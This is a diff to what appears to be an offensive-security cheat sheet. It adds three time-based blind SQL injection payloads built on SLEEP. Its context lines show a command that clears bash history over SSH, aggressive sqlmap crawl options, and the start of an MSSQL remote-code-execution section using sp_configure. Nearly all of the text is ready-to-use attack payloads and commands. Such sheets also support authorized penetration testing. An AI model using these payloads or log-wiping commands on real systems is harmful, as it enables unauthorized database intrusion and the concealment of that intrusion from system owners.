@@ -502,6 +502,17 @@ ssh user@X.X.X.X | cat /dev/null > ~/.bash_history    Clear bash history
                   --forms --batch --crawl=10 --random-agent --level=5 --risk=3 (to crawl)
 ```
 
+**Some payloads**
+- ```SQL
+  0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
+  ```
+- ```SQL
+  0'|(IF((now())LIKE(sysdate()),SLEEP(1),0))|'Z
+  ```
+- ```SQL
+  0'or(now()=sysdate()&&SLEEP(1))or'Z
+  ```
+
 **RCE**
 ```sql
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
